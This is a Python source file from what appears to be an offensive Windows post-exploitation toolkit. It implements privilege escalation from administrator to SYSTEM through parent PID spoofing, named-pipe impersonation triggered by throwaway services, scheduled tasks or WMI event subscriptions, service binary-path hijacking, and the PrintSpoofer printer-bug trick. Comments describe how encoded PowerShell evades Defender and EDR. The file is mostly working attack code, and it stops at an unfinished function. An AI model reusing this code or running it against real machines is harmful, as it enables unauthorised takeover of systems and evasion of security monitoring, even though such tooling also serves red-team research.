# -*- coding: UTF-8 -*-
# By Quentin HARDY (quentin.hardy@protonmail.com) - bobsecq

from impersonate import Impersonate
import logging
from ctypes import *
from windef import *
from utils import *
from scm import serviceControlManager

from time import sleep
import threading
import socket
from tokenmanager import TokenManager
try:
    from msrprn import *
    MSRPRN_LOAD_SUCCESS = True
except Exception as e:
    logging.warning("Impossible to load msrprn module required for RPCSS PE: {0}".format(e))
    MSRPRN_LOAD_SUCCESS = False
#If pywin32 is not available, taskschd is not loaded and TASKSCHD_LOAD_SUCCESS is set to False
try:
    from taskschd import *
    TASKSCHD_LOAD_SUCCESS = True
except Exception as e:
    logging.warning("Impossible to load taskschd module required for some modules: {0}".format(e))
    TASKSCHD_LOAD_SUCCESS = False

class Escalation():
    """
    Class for Privilege escalation
    """
    DEFAULT_TIME_MAX_ANTI_LOCK = 5
    TIMEOUT_THREAD = 10

    def __init__(self, timeMaxAntiLock=DEFAULT_TIME_MAX_ANTI_LOCK, threadTimeout=TIMEOUT_THREAD):
        """
        Constructor
        :param timeMaxAntiLock: Time max for anti lock feature i.e time max for a service ,task scheduler, etc for running
                                a command (e.g. connection to named pipe).
        """
        self.currentPID = GetCurrentProcessId()
        self.serviceName = None #Used by some methods
        self.serviceBin = None  # Used by some methods
        self.timeMaxAntiLock = timeMaxAntiLock #For impersonation
        self.pid = None #Used by some methods
        self.cmd = None #Used by most methods
        self.args = None #Used by most methods
        self.pipeName = None #Used by most methods
        self.randomCanalName = None #Used by some methods
        self.hPipe = None #Used by most methods
        self.subPipeName = None #Used by some methods
        #self.threadTimeout = threadTimeout #Not used anymore

    def getProcessesInfoOpen(self, desiredAccess=PROCESS_ALL_ACCESS, encodingFileName='utf8'):
        '''
        Return info about processes which can be opened with desired Access rights.

        :param desiredAccess: The access to each process object
        :return: dictionary {pid:[filename, {'Name': , 'Domain':}]]}
        '''
        processes = {}
        MAX_PATH = 260
        logging.debug("Getting info about processes which can be opened with {0} access".format(desiredAccess))
        processIds, nReturned = getAllProcessIDs()
        logging.debug("Number of pids: {0}".format(nReturned))
        for index in range(nReturned):
            processId = processIds[index]
            hProcess = OpenProcess(desiredAccess, False, processId)
            if hProcess:
                imageFileName = (c_char * MAX_PATH)()
                if GetProcessImageFileName(hProcess, imageFileName, MAX_PATH) > 0:
                    filename = os.path.basename(imageFileName.value)
                    filenameString = filename.decode(encodingFileName)
                    tDetails = TokenManager.getPrimaryTokenOfPid(processId, impersonation=False)
                    processes[processId] = [filenameString, tDetails['accountname']]
                try:
                    CloseHandle(hProcess)
                except Exception as e:
                    pass
        return processes

    def getCandidatesSpoofPPID(self):
        '''
        Print all processes which can be candidate for spoofPPID()

        :return: dictionary e.g. {pid:[filename, {'Name': , 'Domain':}]}
        '''
        status = TokenManager.enableUserRight('SeDebugPrivilege')
        return self.getProcessesInfoOpen(desiredAccess=PROCESS_ALL_ACCESS)

    def printCandidatesSpoofPPID(self):
        '''
        Print all processes which can be candidate for spoofPPID()

        :return: Always true
        '''
        print("All processes which can be candidate for Parent PID Spoofing - 'handle inheritance':")
        candidates = self.getCandidatesSpoofPPID()
        for aPID, details in dict(sorted(candidates.items())).items():
            name = details[1]['Name']
            domain = details[1]['Domain']
            print("- {0}: {1} [{2}\{3}]".format(aPID, repr(details[0]), repr(domain), repr(name)))
        return True

    def spoofPPID(self,
                  ppid,
                  appName,
                  cmdLine=None,
                  lpProcessAttributes = None,
                  lpThreadAttributes = None,
                  bInheritHandles = 0,
                  creationFlags=(CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT),
                  lpEnvironment=None,
                  lpCurrentDirectory = None
        ):
        """
        Parent PID Spoofing implementation (also named 'handle inheritance').

        The aim is to spoof the parent process identifier (PPID) of a new process to evade monitoring (e.g. av) or
        to elevate privileges. For example, an attacker in a privileged user context (e.g. local administrator) spawns
        a new process and assigns the parent as a process running as SYSTEM (e.g. services.exe).The new process becomes
        elevated via the inherited access token.
        This method uses the CreateProcess API call, which supports a parameter that defines the PPID to use.
        Can be use to 'hide' a process through another parent process (e.g. explorer.exe) or to get system.
        Start a program with a selected parent process.
        Based on a Didier Stevens tool (https://DidierStevens.com)
        :param ppid: selected process id
        :param appName: path to bin or script
        :param cmdLine: arguments to bin or script
        :param lpProcessAttributes: A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned
                                    handle to the new process object can be inherited by child processes. If it is NULL,
                                    the handle cannot be inherited.
        :param lpThreadAttributes: A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned
                                   handle to the new thread object can be inherited by child processes. If
                                   lpThreadAttributes is NULL, the handle cannot be inherited.
        :param bInheritHandles: If this parameter is TRUE, each inheritable handle in the calling process is inherited
                                by the new process. If the parameter is FALSE, the handles are not inherited
        :param creationFlags: The flags that control the priority class and the creation of the process. For a list of
                              values, see https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
        :param lpEnvironment: A pointer to the environment block for the new process. If this parameter is NULL,
                              the new process uses the environment of the calling process.
        :param lpCurrentDirectory: The full path to the current directory for the process. The string can also specify a
                                   UNC path.
        :return: None if an error, othwerwise returns PROCESS_INFORMATION
        """
        status = TokenManager.enableUserRight('SeDebugPrivilege')
        #Acquiring a handle to this specific process
        logging.debug("Opening a handle to process with pid {0}".format(ppid))
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, ppid)
        if hProcess == 0 or hProcess == None:
            logging.error("Impossible to open process with pid {0}: {1}".format(ppid, getLastErrorMessage()))
            return False
        logging.debug("Handle to process with pid {0} opened".format(ppid))
        logging.debug("Determining the buffer size required to support the specified number of attributes")
        size = SIZE_T(0)
        attributeList = None
        attributeCount = 1
        #The parameter 'size' receives the required buffer size in bytes
        status = InitializeProcThreadAttributeList(None, 1, 0, byref(size))
        if size.value == 0:
            logging.error("Impossible to initialize the EMPTY list of attributes for process and thread creation: {0}".format(e))
            return False
        logging.debug("Creating empty attribute list")
        dwSize = len((BYTE * size.value)())
        attributeList = PROC_THREAD_ATTRIBUTE_LIST()
        attributeCount = 1
        status = InitializeProcThreadAttributeList(attributeList, attributeCount, 0, byref(size))
        if status == 0:
            logging.error("Impossible to initialize the list of attributes with size for process and thread creation: {0}".format(e))
            return False
        logging.debug("initializing the AttributeList")
        lpValue = PVOID(hProcess)
        attribute = PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        try:
            UpdateProcThreadAttribute(attributeList, 0, attribute, byref(lpValue), sizeof(lpValue), None, None)
        except Exception as e:
            logging.error("Impossible to uptade the list of attributes for PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: {0}".format(e))
            return False
        logging.debug("Creating the process from the handle of the process")
        startupInfo = STARTUPINFOEX()
        startupInfo.StartupInfo.cb = sizeof(startupInfo)
        startupInfo.lpAttributeList = addressof(attributeList)
        lpProcessInformation = PROCESS_INFORMATION()
        try:
            CreateProcess(appName,
                          cmdLine,
                          lpProcessAttributes,
                          lpThreadAttributes,
                          bInheritHandles,
                          creationFlags,
                          lpEnvironment,
                          lpCurrentDirectory,
                          byref(startupInfo),
                          byref(lpProcessInformation))
        except Exception as e:
            logging.error("Impossible de create the process with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS method: {0}".format(e))
            return False
        try:
            CloseHandle(hProcess)
        except Exception as e:
            logging.warning("Impossible to close handle: {0}".format(e))
        return lpProcessInformation

    def __createSpoofPPIDProcessWithPid(self, *args):
        '''
        Execute a command a SYSTEM via a WMI job and direct command execution

        Create a WMI job, execute it and delete it after.
        :param args:
        :return: True if anti lock feature has not been triggered (no problem detected). Otherwise return False (anti
                 lock feature has been triggered) so a problem occured.
        '''
        logging.debug("Thread for Job created")
        status = self.spoofPPID(ppid=self.pid,
                                appName=self.cmd,
                                cmdLine=self.args,
                                creationFlags=(CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT))
        # Anti lock feature: send a message to pipe if previous operation failed
        return self.__startAntiLockFeature()

    def namedPipeImpersonationViaSpoofPPIDWithPID(self, pid, ps=False):
        """
        Impersonate an account thanks to Spoof PPID - handle inheritance and named pipe

        If ps is enabled, powershell is used for triggering the client connection to pipe.
        :param pid: targeted pid for impersonation
        :param ps: Use powershell code instead of cmd command for named pipe connection.
        :return: True or False
        """
        logging.debug("Starting named pipe impersonation via Spoof PPID with pid {0}...".format(pid))
        status = TokenManager.enableUserRight('SeDebugPrivilege')
        candidtaes = self.getCandidatesSpoofPPID()
        if pid not in candidtaes:
            logging.error("pid {0} is not a valid candidate for Spoof PPID method. Choose another one.".format(pid))
            return False
        status = self.__namedPipeImpersonation(functionMethod=self.__createSpoofPPIDProcessWithPid,
                                               ps=ps,
                                               pid=pid,
                                               pingCmd=False)
        return status

    def __startAntiLockFeature(self):
        """
        Send a message to pipe if previous attack failed

        Send ERROR to the pipe "self.pipeName"
        :return: True if not triggered. Otherwise return False i.e. ERROR message has been sent to the pipe
        """
        logging.debug("Sleeping {0} seconds before triggering anti lock feature".format(self.timeMaxAntiLock))
        sleep(self.timeMaxAntiLock)
        logging.debug("Trying to connect to named pipe {0} if client connection failed just before...".format(self.pipeName))
        try:
            pf = open(self.pipeName, 'w')
            pf.write("ERROR")
            pf.close()
        except Exception as e:
            logging.debug("Anti lock triggered when tried to open, write or close the pipe client side. No bug here.")
            return True
        return False

    def execAsSystemViaCreateService(self, binaryPathName):
        """
        Execute a command as SYSTEM via service creation.

        See executeBinViaCreate() for details.
        :param binaryPathName: path to binary to execute (can be command with arguments)
        :return: return  True or False (if an error)
        """
        logging.info("Executing the following command as SYSTEM via service creation: {0}".format(repr(binaryPathName)))
        serviceName = getRandomString()
        serviceManager = serviceControlManager(target="127.0.0.1")
        status = serviceManager.openSCManager()
        if status == False:
            logging.error("The following command has NOT been executed as SYSTEM via service creation: {0}".format(repr(binaryPathName)))
            return False
        status = serviceManager.executeBinViaCreate(binaryPathName=binaryPathName, serviceName=serviceName)
        if status == False:
            logging.error("The following command has NOT been executed as SYSTEM via service creation: {0}".format(repr(binaryPathName)))
            return False
        serviceManager.closeSCMHandle()
        return True

    def __createServiceForNamedPipeImpersonation(self, *args):
        """
        Create a service, execute the command to named pipe and delete service.

        :param args:
        :return: True if anti lock feature has not been triggered (no problem detected). Otherwise return False (anti
                 lock feature has been triggered) so a problem occured.
        """
        logging.debug("Thread for Service created")
        status = self.execAsSystemViaCreateService(binaryPathName=self.serviceBin)
        #Anti lock feature: send a message to pipe if previous service failed
        return self.__startAntiLockFeature()

    def __namedPipeImpersonation(self,
                                 functionMethod,
                                 ps=True,
                                 debug=False,
                                 waitThread=False,
                                 pipeName=None,
                                 pingCmd=True,
                                 pid=None):
        """
        From elevate administrator to SYSTEM with named pipe impersonation

        If waitThread is enabled, wait the end of the execution of the thread before returning from this function
        If pipeName is given, use this one for exploitation.
        Notice ps code for triggering client connection bypass Windows Defender (Enabled by defaiult)
        :param functionMethod: specified function/method will be executed in the independent thread. The function
                                has to try to connect to named pipe created internally.
        :param ps: A powershell command will be used for connecting to named pipe. Otherwise cmd command.
        :param debug: create file "C:\error2.txt" for debugging powershell code executed (when ps is enabled)
        :param waitThread: wait indefinitely the independent thread finishes
        :param pipeName: Use this pipe name instead of defined internally.
        :param pingCmd: Wait few seconds before conencting to server in cmd command
        :param pid: For spoof ppid (handle inheritance) method
        :return: True, False (if an error)
        TODO: do we need to wait the end of the thread?
        """
        logging.debug("Starting named pipe impersonation...")
        self.pid = pid #Used for spoof ppid - handle inheritance method
        if pipeName == None:
            logging.debug("Named pipe not given: Generate a random named pipe for exploitation")
            self.randomCanalName = getRandomString()
            self.pipeName = r"\\.\pipe\{0}".format(self.randomCanalName)
        else:
            self.pipeName = pipeName
            logging.debug("Named pipe given: Use {0} for exploitation".format(repr(self.pipeName)))
        if ps==False:
            self.cmd = "c:\\windows\\system32\\cmd.exe"
            if pingCmd == True:
                #Wait few seconds before conencting to server
                self.args = "/c ping -n 10 127.0.0.1 >nul && echo 'p' > {0}".format(self.pipeName)
            else:
                self.args = "/c echo 'p' > {0}".format(self.pipeName)
            self.serviceBin = self.cmd +' '+ self.args
        else:
            #Timeout of 10 scds in powershell connection
            if debug == True:
                psCode = """&{{$pipe = new-object System.IO.Pipes.NamedPipeClientStream '.','{0}','Out'; $pipe.Connect(10000); $sw = new-object System.IO.StreamWriter($pipe); $sw.AutoFlush=$true;$sw.WriteLine("d"); $sw.Dispose(); $pipe.Dispose()}} *> C:\\error2.txt"""
            else:
                psCode = """&{{$pipe = new-object System.IO.Pipes.NamedPipeClientStream '.','{0}','Out'; $pipe.Connect(10000); $sw = new-object System.IO.StreamWriter($pipe); $sw.AutoFlush=$true;$sw.WriteLine("d"); $sw.Dispose(); $pipe.Dispose()}} *> null""" #3>&1 2>&1 > null
            psCode = psCode.format(self.randomCanalName)
            logging.debug("ps code: {0}".format(psCode))
            self.cmd = r"C:\\windows\\system32\\cmd.exe"
            self.args = r" /c powershell.exe -encodedcommand {0}".format(encodePScode(psCode))
            self.serviceBin = self.cmd + ' ' + self.args #User for service creation only
        self.serviceName = getRandomString()
        logging.debug("Name Pipe: {0}".format(self.pipeName))
        logging.debug("Service Name: {0}".format(self.serviceName))
        logging.debug("Service Binary: {0}".format(self.serviceBin))
        logging.debug("Create the server named pipe")
        PIPE_ACCESS_DUPLEX = 0x00000003
        PIPE_TYPE_BYTE = 0x00000000
        self.hPipe = createNamedPipe(self.pipeName,
                                openMode=PIPE_ACCESS_DUPLEX,
                                pipeMode=PIPE_TYPE_BYTE,
                                maxInstances=3,
                                defaultTimeOut=50,
                                securityAttributes=None)
        if self.hPipe==None or self.hPipe==0:
            logging.error("Impossible to create the name pipe, impossible to contine")
            return False
        logging.debug("Name pipe created: {0}".format(repr(self.hPipe)))
        logging.debug("Creates a thread to run the pipe client")
        triggerClientThread = threading.Thread(None, functionMethod, "triggerClientThread", (), {})
        triggerClientThread.start()
        logging.debug("Thread successfully created")
        logging.debug("Server process is waiting for a client connection indefinitely...".format(repr(self.hPipe)))
        try:
            ConnectNamedPipe(self.hPipe, None)
        except Exception as e:
            logging.critical("Impossible to wait for a client process to connect to named pipe (server-side): {0}".format(e))
            return False
        logging.debug("A client is connected to the named pipe. Receiving data from pipe client")
        data = readFile(self.hPipe, firstBytesOnly=True)
        logging.debug("First Data received from client: {0}".format(data))
        if b"ERROR"==data:
            logging.error("Impersonation failed. Problem client side. Message from anti lock feature received.")
            try:
                CloseHandle(self.hPipe)
            except Exception as e:
                logging.warning("Impossible to close handle: {0}".format(e))
            return False
        #We don't care about data returned
        logging.debug("Data received from a privileged named pipe. Impersonating...")
        try:
            ImpersonateNamedPipeClient(self.hPipe)
        except Exception as e:
            logging.error("Impossible to impersonate the pipe: {0}".format(e))
            return False
        logging.info("Impersonation successfull")
        logging.info("Current username: {0} ({1})".format(repr(getCurrentUsernameW()), repr(GetCurrentUsername())))
        TokenManager.printAllEffectiveUserRights(printOnDebug=True)
        try:
            CloseHandle(self.hPipe)
        except Exception as e:
            logging.warning("Impossible to close handle: {0}".format(e))
        '''
        logging.debug("Waiting {0} seconds the end of triggering thread".format(self.threadTimeout))
        try:
            triggerClientThread.join(timeout=self.threadTimeout)
        except Exception as e:
            logging.debug("Timeout occured for waiting thread: {0}".format(e))
        '''
        return True

    def namedPipeImpersonationSystemViaSCM(self, ps=True, debug=False):
        """
        From elevate administrator to SYSTEM with named pipe impersonation via SCM

        Create a service, execute as command (cmd or ps) as SYSTEM, connect to named pipe, impersonate and
        delete created service.
        By default, ps (powershell command) is used to avoid EDR detection (e.g. Windows Defender). If ps is
        disabled, some EDR (e.g. Defender) can detect (but not stop) the PE.
        :param ps: A powershell command will be used for connecting to named pipe. Otherwise cmd command.
        :param debug: create file "C:\error2.txt" for debugging powershell code executed (when ps is enabled)
        :return: True or False (if an error)
        """
        logging.debug("Starting named pipe impersonation via Service Control Manager...")
        return self.__namedPipeImpersonation(functionMethod=self.__createServiceForNamedPipeImpersonation,
                                             ps=ps,
                                             debug=debug,
                                             pingCmd=False)

    def execAsSystemViaTaskScheduler(self, cmd, args=None):
        """
        Execute a command as SYSTEM via Task Scheduler

        Create a task, execute as command (ps command, not cmd) as SYSTEM, connect to named pipe, impersonate and
        delete created service.
        :param cmd: command to execute
        :param args: arguments for command
        :return: return  True or False (if an error)
        """
        logging.info("Executing the following command as SYSTEM via Task Scheduler: {0} {1}".format(repr(cmd), repr(args)))
        if TASKSCHD_LOAD_SUCCESS == False:
            logging.warning("Task Scheduler module is not loaded successfully. This command can not be completed")
            return False
        taskName = getRandomString()
        #location = r"\\Microsoft\\Windows\\{0}".format(taskName)
        location = '\\'
        status= create_task(cmd=cmd,
                            arguments=args,
                            name=taskName,
                            location=location,
                            user_name='System', #HighestAvailable RunLevel by default
                            password=None,
                            force=True,
                            #Triggers
                            Enabled=True,
                            #
                            multiple_instances="No New Instance",
                            stop_if_on_batteries=False,
                            force_stop=False,
                            start_when_available=True,
                            run_if_network=False,
                            run_if_idle=False,
                            idle_stop_on_end=True,
                            idle_restart=False,
                            allow_demand_start=True,
                            hidden=False,
                            wake_to_run=False,
                            execution_time_limit=False, #and ExecutionTimeLimit = 'PT0S' is set by default
                            #Action
                            )
        if status == False:
            logging.error("Impossible to create the Task {0}: {1}".format(taskName, ""))
            return False
        logging.debug("Task {0} created".format(taskName))
        status = run(taskName, location=location)
        if status == False:
            logging.error("Impossible to run the Task {0}: {1}".format(taskName, ""))
            return False
        logging.debug("Task {0} executed".format(taskName))
        status = delete_task(taskName, location=location)
        if status == False:
            logging.warning("Impossible to delete the Task {0}: {1}".format(taskName, ""))
        logging.debug("Task {0} deleted".format(taskName))
        return True

    def __createTaskForNamedPipeImpersonation(self, *args):
        '''
        Execute a command as SYSTEM via Task Scheduler

        Create a task, execute as command (ps command, not cmd) as SYSTEM, connect to named pipe, impersonate and
        delete created service.
        :param args:
        :return: True if anti lock feature has not been triggered (no problem detected). Otherwise return False (anti
                 lock feature has been triggered) so a problem occured.
        '''
        logging.debug("Thread for Task created")
        status = self.execAsSystemViaTaskScheduler(cmd=self.cmd, args=self.args)
        # Anti lock feature: send a message to pipe if previous service failed
        return self.__startAntiLockFeature()

    def namedPipeImpersonationSystemViaTaskScdh(self, debug=False):
        '''
        From elevate administrator to SYSTEM with named pipe impersonation via Task Scheduler
        Create a task scheduler, execute as command (cmd or ps) as SYSTEM, connect to named pipe, impersonate and
        delete created task.
        :param debug: create file "C:\error2.txt" for debugging powershell code executed (when ps is enabled)
        :return: True or False.
        TODO: can work with a cmd command instead of a PS command? By default, with ps=False, does not work.
        '''
        logging.debug("Starting named pipe impersonation via Task Scheduler...")
        if TASKSCHD_LOAD_SUCCESS == False:
            logging.warning("Task Scheduler module is not loaded successfully. This command can not be completed")
            return False
        return self.__namedPipeImpersonation(functionMethod=self.__createTaskForNamedPipeImpersonation,
                                             ps=True,
                                             debug=debug)

    def __alterServiceForNamedPipeImpersonation(self, *args):
        '''
        Alter the path bin of service self.targetServiceName, execute it and restore it after with named pipe method

        :param args: 
        :return: True if anti lock feature has not been triggered (no problem detected). Otherwise return False (anti
                 lock feature has been triggered) so a problem occured.
        '''
        sm = serviceControlManager()
        sm.openSCManager()
        logging.debug("Getting BinaryPathName of service {0}".format(repr(self.targetServiceName)))
        info = sm.queryServiceConfigFromName(self.targetServiceName)
        if info == None:
            logging.error("Impossible to get configuration of service {0}, impossible to continue".format(repr(self.targetServiceName)))
            return False
        oldBinaryPathName = info["BinaryPathName"]
        logging.debug("Old BinaryPathName: {0}".format(repr(oldBinaryPathName)))
        logging.debug("Setting the BinaryPathName of this service to {0}".format(repr(self.serviceBin)))
        status = sm.changeServiceConfigFromName(self.targetServiceName,
                                                serviceType=SERVICE_NO_CHANGE,
                                                startType=SERVICE_NO_CHANGE,
                                                errorControl=SERVICE_NO_CHANGE,
                                                binaryFile=self.serviceBin)
        if status == False:
            logging.error("Impossible to modify configuration of service {0}, impossible to continue".format(repr(self.targetServiceName)))
            return False
        info = sm.queryServiceConfigFromName(self.targetServiceName)
        if info == None:
            logging.error("Impossible to get configuration of service {0}".format(repr(self.targetServiceName)))
        else:
            logging.debug("New BinaryPathName: {0}".format(repr(info["BinaryPathName"])))
        logging.debug("Executing the service for triggering client connection to named pipe...")
        status = sm.startServiceFromName(self.targetServiceName)
        if status == False:
            logging.error("Impossible to start service {0} for triggering named pipe impersonation".format(repr(self.targetServiceName)))
        #status = sm.controlServiceFromName(self.targetServiceName, SERVICE_CONTROL_STOP)
        logging.debug("Restoring old BinaryPathName for service {0}".format(self.targetServiceName))
        status = sm.changeServiceConfigFromName(self.targetServiceName,
                                                serviceType=SERVICE_NO_CHANGE,
                                                startType=SERVICE_NO_CHANGE,
                                                errorControl=SERVICE_NO_CHANGE,
                                                binaryFile=oldBinaryPathName)
        if status == False:
            logging.error("Impossible to restore binaryFile to {0} of service {1}".format(repr(oldBinaryPathName), repr(self.targetServiceName)))
        info = sm.queryServiceConfigFromName(self.targetServiceName)
        if info == None:
            logging.error("Impossible to get configuration of service {0}".format(repr(self.targetServiceName)))
        else:
            logging.debug("Current BinaryPathName: {0}".format(repr(info["BinaryPathName"])))
        # Anti lock feature: send a message to pipe if previous service failed
        return self.__startAntiLockFeature()


    def namedPipeImpersonationViaAService(self, targetServiceName):
        '''
        Impersonate an account specified for running a service with named pipe method

        The service should be stopped before using it for impersonation.
        :param targetServiceName: the service name which is targeted
        :return: True, False (if an error)
        '''
        logging.debug("Starting named pipe impersonation via SCM for the account linked to the service {0}...".format(targetServiceName))
        self.targetServiceName = targetServiceName
        return self.__namedPipeImpersonation(functionMethod=self.__alterServiceForNamedPipeImpersonation)

    def printCandidatesServices(self):
        '''
        Print all candidates for services PE
        :return: True or False if an error
        '''
        serviceManager = serviceControlManager(target="127.0.0.1")
        status = serviceManager.openSCManager()
        if status == False:
            return False
        status = serviceManager.printServicesByServiceStartName(serviceType=SERVICE_WIN32,
                                                                serviceState=SERVICE_STATE_ALL,
                                                                withConfig=True,
                                                                withSD=True)
        if status == False:
            return False
        serviceManager.closeSCMHandle()
        return True

    def namedPipeImpersonationViaATask(self, targetTaskName):
        '''
        Impersonate an account specified for running a Task with named pipe method

        :param targetTaskName: task name
        :return: True, False (if an error)
        TODO: Implement
        '''
        raise NotImplementedError()

    def execAsSystemViaWmiJobCmd(self, cmd, args="", timeWait=15):
        '''
        Execute a command as SYSTEM via a WMI job and direct command execution i.e. wmic.exe is used for executing
        commands and creating the WMI job.

        Create a WMI job, execute it and delete it after.
        :param cmd: command to execute
        :param args: arguments for command
        :param timeWait: Time to wait before deleting job after execution. It has to be >= 15
        :return: True or False (if an error)
        '''
        logging.debug("Trying to execute WMI commands for executing your command as SYSTEM...")
        self.randomWmiEventFilterName = getRandomString()
        self.randomWmiEventFilterConsumerName = getRandomString()
        ARGS_CREATE_1 = r"""/namespace:"\\root\subscription" PATH __EventFilter CREATE Name="{0}", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" """
        ARGS_CREATE_2 = r"""/namespace:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="{0}", ExecutablePath="{1}", CommandLineTemplate="{2}" """
        ARGS_CREATE_3 = r"""/namespace:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name="{0}"', Consumer='CommandLineEventConsumer.Name="{1}"' """
        argsCreate1=ARGS_CREATE_1.format(self.randomWmiEventFilterName)
        argsCreate2=ARGS_CREATE_2.format(self.randomWmiEventFilterConsumerName, cmd, args)
        argsCreate3=ARGS_CREATE_3.format(self.randomWmiEventFilterName, self.randomWmiEventFilterConsumerName)
        ARGS_DELETE_1 = r"""/namespace:"\\root\subscription" PATH __EventFilter WHERE Name="{0}" DELETE """
        ARGS_DELETE_2 = r"""/namespace:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="{0}" DELETE """
        ARGS_DELETE_3 = r"""/namespace:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="{0}"' DELETE """
        argsDelete1 = ARGS_DELETE_1.format(self.randomWmiEventFilterName)
        argsDelete2 = ARGS_DELETE_2.format(self.randomWmiEventFilterConsumerName)
        argsDelete3 = ARGS_DELETE_3.format(self.randomWmiEventFilterName)
        status = executeSystemCommand(cmd="wmic.exe", args=argsCreate1, window=False)
        if status == 0:
            logging.debug("Command 1/3 executed sucessfully, continue")
        else:
            logging.error("Impossible to execute the command 1/3, stop here")
            return False
        status = executeSystemCommand(cmd="wmic.exe", args=argsCreate2, window=False)
        if status == 0:
            logging.debug("Command 2/3 executed sucessfully, continue")
        else:
            logging.error("Impossible to execute the command 2/3, stop here")
            return False
        status = executeSystemCommand(cmd="wmic.exe", args=argsCreate3, window=False)
        if status == 0:
            logging.debug("Command 3/3 executed sucessfully")
        else:
            logging.error("Impossible to execute the command 3/3, stop here")
            return False
        logging.debug("Waiting command execution {0} seconds".format(timeWait))
        sleep(timeWait)
        logging.debug("Normally, the command as been executed as SYSTEM now")
        logging.debug("Cleaning...")
        status = executeSystemCommand(cmd="wmic.exe", args=argsDelete1, window=False)
        if status == 0:
            logging.debug("Command 1/3 executed sucessfully, cleaning continue")
        else:
            logging.warning("Impossible to execute the command 1/3")
        status = executeSystemCommand(cmd="wmic.exe", args=argsDelete2, window=False)
        if status == 0:
            logging.debug("Command 2/3 executed sucessfully, cleaning continue")
        else:
            logging.warning("Impossible to execute the command 2/3")
        status = executeSystemCommand(cmd="wmic.exe", args=argsDelete3, window=False)
        if status == 0:
            logging.debug("Command 3/3 executed sucessfully, cleaning finished")
        else:
            logging.warning("Impossible to execute the command 3/3")
        logging.debug("Cleaning finished")
        return True

    def __createWmiJobForNamedPipeImpersonation(self, *args):
        '''
        Execute a command a SYSTEM via a WMI job and direct command execution

        Create a WMI job, execute it and delete it after.
        :param args:
        :return: True if anti lock feature has not been triggered (no problem detected). Otherwise return False (anti
                 lock feature has been triggered) so a problem occured.
        '''
        logging.debug("Thread for Job created")
        status = self.execAsSystemViaWmiJobCmd(cmd=self.cmd, args=self.args)
        # Anti lock feature: send a message to pipe if previous service failed
        return self.__startAntiLockFeature()

    def namedPipeImpersonationSystemViaWmiJobCmd(self, ps=True):
        """
        Impersonate SYSTEM account thanks to WMI job creation (via cmd.exe & wmic.exe) and named pipe

        If ps is enabled, powershell is used for triggering the client connection to pipe.
        :param ps: Use powershell code instead of cmd command for named pipe connection.
        :return: True or False
        """
        self.timeMaxAntiLock=15
        logging.debug("Starting named pipe impersonation via WMI Job (cmd.exe commands)...")
        status = self.__namedPipeImpersonation(functionMethod=self.__createWmiJobForNamedPipeImpersonation, ps=ps)
        self.timeMaxAntiLock=self.DEFAULT_TIME_MAX_ANTI_LOCK
        return status

    def connectToNamedPipeViaPrinter(self):
        '''
        Use Printer Bug for triggerring a SYSTEM named piped connection to \\MACHINE_NAME\\pipe\CONTROL_THIS\pipe\spoolss

        The server has to listen on named pipe: \\127.0.0.1\\pipe\CONTROL_THIS\pipe\spoolss
        :return: False if an error. Return True
        Thanks: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
        Source: https://github.com/itm4n/PrintSpoofer/blob/975a93c2d56fb29ccbcc7fec0ea6da141626eb7c/PrintSpoofer/PrintSpoofer.cpp
        Help: https://github.com/leechristensen/SpoolSample/blob/96171c3e9d8b99d35c9af5430eef86090fb6e378/MS-RPRN/ms-rprn_h.h
        '''
        logging.debug("Triggering Printer Bug for named connection as SYSTEM...")
        accessRequired = 0
        hPrinter = PVOID()
        targetServer = r"\\{0}".format(getLocalNetbiosName())
        targetServer = create_unicode_buffer(targetServer)
        configBuffer = create_string_buffer(8192)
        devModeContainer = cast(configBuffer, POINTER(DEVMODE_CONTAINER))
        devModeContainer.cbBuf=0
        devModeContainer.pDevMode = None
        logging.debug("Retrieving a handle for the local printer")
        try:
            status = RpcOpenPrinter(targetServer, byref(hPrinter), None, devModeContainer, accessRequired)
        except Exception as e:
            logging.error("Impossible to retrieve a handle for the local printer: {0}".format(e))
            return False
        if status != RPC_S_OK:
            logging.error("Impossible to retrieve a handle for the local printer: {0}".format(getLastErrorMessage()))
            return False
        logging.debug("Handle to the local printer object is retrieved")
        captureServerStr = r"\\{0}/pipe/{1}".format(socket.gethostname(), self.subPipeName)
        captureServer = create_unicode_buffer(captureServerStr)
        logging.debug("Creating a remote remote change notification object. Piped name: {0}".format(repr(captureServerStr)))
        try:
            status = RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, None)
        except Exception as e:
            logging.error("During creation of a remote change notification object, following error: {0}".format(e))
        if status != RPC_S_OK:
            logging.debug("During creation of a remote change notification object, following error: {0}".format(getLastErrorMessage()))
            #return False
        logging.debug("Closing the handle to the printer objec")
        try:
            status = RpcClosePrinter(byref(hPrinter))
        except Exception as e:
            logging.error("Impossible to close the handle to the printer object: {0}".format(e))
        if status != RPC_S_OK:
            logging.warning("Impossible to close the handle to the printer object: {0}".format(getLastErrorMessage()))
        else:
            logging.debug("Handle to the printer object is closed")
        return True

    def __createPrinterBugNamedPipeImpersonation(self, *args):
        '''
        See connectToNamedPipeViaPrinter()

        :param args:
        :return: True if anti lock feature has not been triggered (no problem detected). Otherwise return False (anti
                 lock feature has been triggered) so a problem occured.
        '''
        logging.debug("Thread for Printer BUG")
        status = self.connectToNamedPipeViaPrinter()
        # Anti lock feature: send a message to pipe if previous service failed
        return self.__startAntiLockFeature()

    def namedPipeImpersonationSystemViaPrinterBug(self):
        """
        Impersonate SYSTEM account thanks to Printer Bug and named pipe

        https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
        :return: True or False (if an error)
        """
